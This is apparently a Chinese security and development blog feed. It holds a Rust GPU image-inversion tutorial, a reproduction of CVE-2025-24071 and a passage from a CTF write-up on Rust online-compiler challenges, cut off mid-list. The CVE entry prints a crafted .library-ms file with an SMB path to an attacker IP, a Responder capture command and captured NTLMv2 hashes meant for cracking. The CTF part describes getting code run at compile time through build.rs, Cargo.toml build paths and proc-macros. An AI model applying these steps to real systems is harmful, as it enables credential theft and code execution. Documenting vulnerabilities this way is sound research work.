class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gelu_array::launch::&lt;<span class="type">f32</span>, R&gt;(</span><br><span class="line">            &amp;client,</span><br><span class="line">            CubeCount::<span class="title function_ invoke__">Static</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">            CubeDim::<span class="title function_ invoke__">new</span>(<span class="number">2u32</span>, <span class="number">2u32</span>, <span class="number">1u32</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;input_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;input_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;output_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><h2 id="实现一个加速反色"><a href="#实现一个加速反色" class="headerlink" title="实现一个加速反色"></a>实现一个加速反色</h2><p>cpu处理</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> image::&#123;ImageBuffer, Rgb, RgbImage&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// 1. 读取图像</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">img</span> = image::<span class="title function_ invoke__">open</span>(<span class="string">&quot;./../image.jpg&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="comment">// 2. 转换为 RGB 格式（确保处理颜色通道）</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rgb_img</span> = img.<span class="title function_ invoke__">to_rgb8</span>();</span><br><span class="line">    <span class="comment">// 3. 创建可变的 ImageBuffer</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buffer</span>: RgbImage = ImageBuffer::<span class="title function_ invoke__">new</span>(rgb_img.<span class="title function_ invoke__">width</span>(), rgb_img.<span class="title function_ invoke__">height</span>());</span><br><span class="line">    <span class="comment">// 4. 遍历像素并反转颜色</span></span><br><span class="line">    <span class="keyword">for</span> (x, y, pixel) <span class="keyword">in</span> rgb_img.<span class="title function_ invoke__">enumerate_pixels</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">inverted</span> = <span class="title function_ invoke__">Rgb</span>([</span><br><span class="line">            <span class="number">255</span> - pixel[<span class="number">0</span>],  <span class="comment">// 反转红色通道</span></span><br><span class="line">            <span class="number">255</span> - pixel[<span class="number">1</span>],  <span class="comment">// 反转绿色通道</span></span><br><span class="line">            <span class="number">255</span> - pixel[<span class="number">2</span>],  <span class="comment">// 反转蓝色通道</span></span><br><span class="line">        ]);</span><br><span class="line">        buffer.<span class="title function_ invoke__">put_pixel</span>(x, y, inverted);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 5. 保存处理后的图像</span></span><br><span class="line">    buffer.<span class="title function_ invoke__">save</span>(<span class="string">&quot;./../output.jpg&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gpu处理，这里可以看到cubecl使用的并不只有泛型，还可以使用u32等类型去运算，但必需保证运算的类型是可以被支持的，否则会出现以下错误</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U8 is not a valid WgpuElement</span><br></pre></td></tr></table></figure><p>实现</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> core;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> core::<span class="type">u32</span>;</span><br><span class="line"><span class="keyword">use</span> cubecl::prelude::Float;</span><br><span class="line"><span class="keyword">use</span> std::ops::Sub;</span><br><span class="line"><span class="keyword">use</span> cubecl::prelude::*;</span><br><span class="line"><span class="keyword">use</span> cubecl::wgpu::WgpuDevice;</span><br><span class="line"><span class="keyword">use</span> image::&#123;ImageBuffer, Rgb&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>(input1: &amp;Array&lt;Line&lt;<span class="type">u32</span>&gt;&gt;,output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;<span class="type">u32</span>&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS &lt; input1.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">            output[ABSOLUTE_POS] = <span class="title function_ invoke__">gelu_scalar</span>(input1[ABSOLUTE_POS])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube]</span>  <span class="comment">// 标记为GPU函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_scalar</span>(x: Line&lt;<span class="type">u32</span>&gt;) <span class="punctuation">-&gt;</span> Line&lt;<span class="type">u32</span>&gt; &#123;</span><br><span class="line">    <span class="title function_ invoke__">minus</span>(x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">minus</span>(a:Line&lt;<span class="type">u32</span>&gt;) <span class="punctuation">-&gt;</span> Line&lt;<span class="type">u32</span>&gt; &#123;</span><br><span class="line">    Line::<span class="title function_ invoke__">new</span>(<span class="type">u32</span>::<span class="title function_ invoke__">max_value</span>())-a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">launch</span>&lt;R: Runtime&gt;(device: &amp;R::Device,list:&amp;[<span class="type">u8</span>],w:<span class="type">u32</span>,h:<span class="type">u32</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span> = R::<span class="title function_ invoke__">client</span>(device);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">vectorization</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">output_handle</span> = client.<span class="title function_ invoke__">empty</span>(list.<span class="title function_ invoke__">len</span>() * core::mem::size_of::&lt;<span class="type">u8</span>&gt;());</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input_handle</span> = client.<span class="title function_ invoke__">create</span>(list);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        gelu_array::launch::&lt;R&gt;(</span><br><span class="line">            &amp;client,</span><br><span class="line">            CubeCount::<span class="title function_ invoke__">Static</span>(<span class="number">8000</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">            CubeDim::<span class="title function_ invoke__">new</span>(<span class="number">100u32</span>, <span class="number">10u32</span>, <span class="number">1u32</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">u32</span>&gt;(&amp;input_handle, list.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">u32</span>&gt;(&amp;output_handle, list.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">        )</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bytes</span> = client.<span class="title function_ invoke__">read_one</span>(output_handle.<span class="title function_ invoke__">binding</span>());</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bytes2</span> = client.<span class="title function_ invoke__">read_one</span>(input_handle.<span class="title function_ invoke__">binding</span>());</span><br><span class="line">    <span class="comment">// 把RGB Vec&lt;u8&gt;转化为图片</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span>: ImageBuffer&lt;Rgb&lt;<span class="type">u8</span>&gt;, <span class="type">Vec</span>&lt;<span class="type">u8</span>&gt;&gt; = ImageBuffer::<span class="title function_ invoke__">from_raw</span>(w,h,bytes).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    b.<span class="title function_ invoke__">save</span>(<span class="string">&quot;./../output.png&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Runtime</span> = cubecl::wgpu::WgpuRuntime;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">device</span> = WgpuDevice::<span class="title function_ invoke__">default</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">img</span> = image::<span class="title function_ invoke__">open</span>(<span class="string">&quot;./../image.jpg&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="comment">// 转换为 RGB Vec&lt;u8&gt;格式（确保处理颜色通道）</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rgb_img</span> = img.<span class="title function_ invoke__">to_rgb8</span>();</span><br><span class="line">    <span class="keyword">let</span> (w,h) = rgb_img.<span class="title function_ invoke__">dimensions</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">buf</span> = rgb_img.<span class="title function_ invoke__">into_raw</span>();</span><br><span class="line">    launch::&lt;Runtime&gt;(&amp;device,&amp;buf,w,h);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> gpu运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-24071-windows资源管理器欺骗漏洞</title>
      <link href="/2025/03/24/CVE-2025-24071-windows%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/03/24/CVE-2025-24071-windows%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><ul><li>Windows 10 Version 1809 for x64-based Systems</li><li>Windows 10 Version 1809 for 32-bit Systems</li><li>Windows Server 2025 (Server Core installation)</li><li>Windows Server 2025</li><li>Windows Server 2012 R2 (Server Core installation)</li><li>Windows Server 2012 R2</li><li>Windows Server 2016 (Server Core installation)</li><li>Windows Server 2016</li><li>Windows 10 Version 1607 for x64-based Systems</li><li>Windows 10 Version 1607 for 32-bit Systems</li><li>Windows 10 for x64-based Systems</li><li>Windows 10 for 32-bit Systems</li><li>Windows 11 Version 24H2 for x64-based Systems</li><li>Windows 11 Version 24H2 for ARM64-based Systems</li><li>Windows Server 2022, 23H2 Edition (Server Core installation)</li><li>Windows 11 Version 23H2 for x64-based Systems</li><li>Windows 11 Version 23H2 for ARM64-based Systems</li><li>Windows 10 Version 22H2 for 32-bit Systems</li><li>Windows 10 Version 22H2 for ARM64-based Systems</li><li>Windows 10 Version 22H2 for x64-based Systems</li><li>Windows 11 Version 22H2 for x64-based Systems</li><li>Windows 11 Version 22H2 for ARM64-based Systems</li><li>Windows 10 Version 21H2 for x64-based Systems</li><li>Windows 10 Version 21H2 for ARM64-based Systems</li><li>Windows 10 Version 21H2 for 32-bit Systems</li><li>Windows Server 2022 (Server Core installation)</li><li>Windows Server 2022</li><li>Windows Server 2019 (Server Core installation)</li><li>Windows Server 2019</li></ul></blockquote><h2 id="补丁信息"><a href="#补丁信息" class="headerlink" title="补丁信息"></a>补丁信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KB5053606</span><br></pre></td></tr></table></figure><h2 id="利用概述"><a href="#利用概述" class="headerlink" title="利用概述"></a>利用概述</h2><p>通过构造一个恶意的SMB路径的.library-ms文件并诱导受害者解压，在解压过程中，windows文件管理器将自动解析library-ms文件的内容以进行阅览和检索，此时将检索其中的SMB路径，从而触发与目的路径的NTML的认证握手，导致NTLMv2的哈希被泄露，进而被攻击者用于进一步攻击。</p><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>SMB（Server Message Block） 是一种用于在计算机网络中实现<strong>文件共享、打印机共享和通信</strong>的网络协议</p><h5 id="Windows-的标准格式是UNC-路径"><a href="#Windows-的标准格式是UNC-路径" class="headerlink" title="Windows 的标准格式是UNC 路径"></a>Windows 的标准格式是UNC 路径</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\&lt;服务器名或IP地址&gt;\&lt;共享名&gt;\&lt;目录或文件&gt;</span><br></pre></td></tr></table></figure><p>在windows的SMB读取过程中，会发送NTLM认证握手</p><h3 id="library-ms"><a href="#library-ms" class="headerlink" title=".library-ms"></a>.library-ms</h3><p><code>.library-ms</code> 是 Windows 系统中用于管理 <strong>“库”（Libraries）</strong> 的特殊配置文件。它从 Windows 7 开始引入，用于整合和快速访问用户分散在不同位置的文件（如文档、图片、音乐等）。本质是一个 <strong>XML 文件</strong>，可以通过文本编辑器（如记事本）查看和编辑。以下是一个文档的示例内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">libraryDescription</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/2009/08/StorageService/Library&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>文档<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">isLibraryPinned</span>&gt;</span>true<span class="tag">&lt;/<span class="name">isLibraryPinned</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iconReference</span>&gt;</span>imageres.dll,-1002<span class="tag">&lt;/<span class="name">iconReference</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">templateInfo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">folderType</span>&gt;</span>&#123;7d49d726-3c21-4f05-99aa-fdc2c9474656&#125;<span class="tag">&lt;/<span class="name">folderType</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">templateInfo</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">searchConnectorDescriptionList</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">searchConnectorDescription</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">isDefaultSaveLocation</span>&gt;</span>true<span class="tag">&lt;/<span class="name">isDefaultSaveLocation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">simpleLocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>shell:::&#123;A8CDFF1C-4878-43BE-B5FD-F8091C1C60D0&#125;<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">simpleLocation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">searchConnectorDescription</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">searchConnectorDescriptionList</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">libraryDescription</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;name&gt;</code>：库的显示名称（如“文档”）。</li><li><code>&lt;iconReference&gt;</code>：库的图标来源（如系统 DLL 文件中的图标索引）。</li><li><code>&lt;url&gt;</code>：关联的文件夹路径（这里是利用的关键点）。</li><li><code>&lt;isDefaultSaveLocation&gt;</code>：是否为默认保存位置。</li></ul><h3 id="尝试复现"><a href="#尝试复现" class="headerlink" title="尝试复现"></a>尝试复现</h3><p>首先我们需要有一个library-ms的模板，其中url放入的则是目标ip的地址</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">libraryDescription</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/windows/2009/library&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">searchConnectorDescriptionList</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">searchConnectorDescription</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">simpleLocation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>\\ip_address\shared<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">simpleLocation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">searchConnectorDescription</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">searchConnectorDescriptionList</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">libraryDescription</span>&gt;</span></span><br></pre></td></tr></table></figure><p>并为其命名，这里的命名是随意的，譬如hacked.library-ms，此时我们将攻击机的ip地址写入后再进行压缩。</p><p>紧接着，我们在kali中对其进行监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -v</span><br></pre></td></tr></table></figure><p>然后对压缩包进行解压，此时我们在攻击机中可以看到已经有了反应</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SMB] NTLMv2-SSP Client   : 192.168.80.134</span><br><span class="line">[SMB] NTLMv2-SSP Username : DESKTOP-D4RBES3\yu3</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : yu3::DESKTOP-D4RBES3:128ca242d7dd87d0:626246E5FBB74C638625A07E8400ADFE:01010000000000000007A5D7EE9BDB014E75D8DC02811CEE0000000002000800590042004D004B0001001E00570049004E002D0055004F004F0044004E004E00580057004F004100470004003400570049004E002D0055004F004F0044004E004E00580057004F00410047002E00590042004D004B002E004C004F00430041004C0003001400590042004D004B002E004C004F00430041004C0005001400590042004D004B002E004C004F00430041004C00070008000007A5D7EE9BDB01060004000200000008003xxxxxxxxxxxxxxxxxxx0020000001DA428B46F65565222FC18C404D73517EDBC06783D5A5A4D0900D3599E667450A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00380030002E00310032003800000000000000000000000000                            </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.80.134</span><br><span class="line">[SMB] NTLMv2-SSP Username : DESKTOP-D4RBES3\yu3</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : yu3::DESKTOP-D4RBES3:f8740cfcfde85a8b:63A96B39B46CFBF239190987CE57680C:01010000000000000007A5D7EE9BDB0138AE6847214CF01200000000xxxxxxxxxx004D004B0001001E00570049004E002D0055004F004F0044004E004E00580057004F004100470004003400570049004E002D0055004F004F0044004E004E00580057004F00410047002E00590042004D004B002E004C004F00430041004C0003001400590042004D004B002E004C004F00430041004C0005001400590042004D004B002E004C004F00430041004C00070008000007A5D7EE9BDB010600040002000000080030003000000000000000010000000020000001DA428B46F65565222FC18C404D73517EDBC06783D5A5A4D0900D3599E667450A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00380030002E00310032003800000000000000000000000000                          </span><br></pre></td></tr></table></figure><p>之后就可以将其放入hashcat进行爆破密码</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rust-web编译题型</title>
      <link href="/2025/03/13/rust-web%E7%BC%96%E8%AF%91%E9%A2%98%E5%9E%8B/"/>
      <url>/2025/03/13/rust-web%E7%BC%96%E8%AF%91%E9%A2%98%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="rust在线编译项目常见漏洞"><a href="#rust在线编译项目常见漏洞" class="headerlink" title="rust在线编译项目常见漏洞"></a>rust在线编译项目常见漏洞</h1><p>近年来，随着Rust语言在高性能、内存安全等领域的优势被广泛认可，越来越多的开发者选择将其应用于后端开发，尤其在WebAssembly、微服务和高并发场景中表现亮眼。然而，Rust生态的快速扩张也带来了新的安全挑战：尽管语言本身通过所有权机制规避了内存安全问题，但Web应用层的逻辑漏洞（如SQL注入、身份验证绕过）、第三方库的潜在缺陷（如未充分审计的<code>unsafe</code>代码滥用）以及对安全实践的过度自信（如忽略输入验证或错误配置CORS策略），正在导致Rust相关的Web安全问题逐渐浮出水面。社区亟需在享受Rust底层安全红利的同时，建立更完善的安全开发规范，加强依赖库审计，并推动Web框架的漏洞响应机制，以应对日益复杂的安全威胁。而本次就是在阿里ctf中出现的一道rust编译类题目，故总结了一套相关的相关知识。</p><h2 id="跨项目引用"><a href="#跨项目引用" class="headerlink" title="跨项目引用"></a>跨项目引用</h2><p>在Rust生态中，<code>Cargo.toml</code>文件如同项目的<strong>中枢神经</strong>，扮演着至关重要的<strong>清单（Manifest）</strong>角色。其不仅是一份静态的配置文件，还是是开发者与Rust编译工具链（Cargo）之间的核心。通过toml，开发者能够以声明式语法精确控制项目——从定义包元数据（如版本、作者、许可证）、声明依赖关系（通过本地路径、Git仓库或官方注册表[crates.io]引入第三方crate），到定制编译策略（如特性开关、优化级别、目标平台配置），甚至扩展自定义构建脚本。</p><p>实现跨项目引用的核心机制，则隐藏在<code>Cargo.toml</code>的特定字段中：</p><h3 id="dependence引用"><a href="#dependence引用" class="headerlink" title="dependence引用"></a>dependence引用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[dependencies]</span><br><span class="line">项目名称 = &#123;path = &quot;本地路径&quot;&#125;</span><br><span class="line">项目名称 = &#123;git = &quot;git项目地址&quot;&#125;</span><br><span class="line">项目名称 = &#123;version = &quot;版本&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="引用本地过程"><a href="#引用本地过程" class="headerlink" title="引用本地过程"></a>引用本地过程</h3><p>Rust的过程宏（Procedural Macros）是元编程（metaprogramming）的核心工具之一，允许开发者在<strong>编译时</strong>对代码进行动态生成和转换。与声明宏（Declarative Macros）不同，过程宏通过<strong>自定义代码逻辑</strong>直接操作抽象语法树（AST），实现更复杂的代码生成能力。以下是过程宏的深度解析，而我们也可以通过<code>Cargo.toml</code>对其进行引用</p><p>那么如果现在存在一个文件夹拥有如下的rust项目的文件夹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">├─testaaa</span><br><span class="line">│  ├─.idea</span><br><span class="line">│  ├─src</span><br><span class="line">│  └─Cargo.toml</span><br><span class="line">│     </span><br><span class="line">└─testbbb</span><br><span class="line">    ├─.idea</span><br><span class="line">    ├─src</span><br><span class="line">    └─Cargo.toml</span><br></pre></td></tr></table></figure><p>那么此时可以通过在testaaa项目的Cargo.toml中使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[lib]</span><br><span class="line">proc-macro = ture</span><br><span class="line">path = &quot;../[项目名称]/main.rs&quot;</span><br></pre></td></tr></table></figure><p>来对其他的过程宏项目进行引用。利用这个方法，可以实现在引用的项目中不使用lib.rs，来生成proc-macro。如此一来我们遍可以在项目a的main.rs里实现过程宏，虽然不能被正常编译，但是可以在项目b中引用，从而实现编译。</p><p>当然不仅这些，如果rust启用了一些unstable特性，如（metabuild等），这些功能也会在未来可能成为利用的关键点</p><h2 id="编译执行"><a href="#编译执行" class="headerlink" title="编译执行"></a>编译执行</h2><p>rust的编译存在以下三种执行</p><ul><li>过程宏编译执行 </li><li>build.rs执行 </li><li>编译时计算（不能利用）const fn</li></ul><p>而其中build构建执行和过程宏编译时执行是常可以利用的项，他们可以实现通过编译就进行一些命令的执行。</p><h3 id="利用Cargo-toml实现main-rs自执行"><a href="#利用Cargo-toml实现main-rs自执行" class="headerlink" title="利用Cargo.toml实现main.rs自执行"></a>利用Cargo.toml实现main.rs自执行</h3><p>很多时候我们无法自己创建build.rs，但是可以利用Cargo.toml中的选项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build = &quot;路径&quot;</span><br></pre></td></tr></table></figure><p>我们可以将build的路径换成任何我们想要的rs文件（<strong>包括 main.rs ！</strong>我们可以通过这点在很多有限制的地方进行执行）从而实现build.rs执行。</p><p>不只是这种情况，前面我们提到过rust的依赖选项，rust通过从crates.io下载源码或读取本机的源码编译。那么此时这些crates中的build.rs文件也会进行运行，我们也可以通过这种方式进行利用</p><h3 id="利用过程宏"><a href="#利用过程宏" class="headerlink" title="利用过程宏"></a>利用过程宏</h3><p>在Cargo.toml中启用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[lib]</span><br><span class="line">proc-macro = ture</span><br><span class="line">path = &quot;&quot;</span><br></pre></td></tr></table></figure><p>来引用过程宏或开启过程宏来运行，这里巧妙的是，cargo会直接对path的目标文件进行rustc编译，也就是说，即使目标文件的结构并不符合rust项目的标准，只要rust代码没有错误都可以将其作为过程宏生成。</p><h2 id="替换编译器、资源"><a href="#替换编译器、资源" class="headerlink" title="替换编译器、资源"></a>替换编译器、资源</h2><p>很多情况我们并不能正常回显或是不能正常的触发一个程序，那么我们可以通过“挖空”程序本体，换入我们的代码，这样一来，程序就可以通过流程的调用来触发。</p><p>以下是linux中rustc和cargo的常见位置</p><h4 id="系统级"><a href="#系统级" class="headerlink" title="系统级"></a>系统级</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/.cargo/bin/         # rustc, cargo, rustup 等可执行文件</span><br><span class="line">~/.cargo/registry/    # 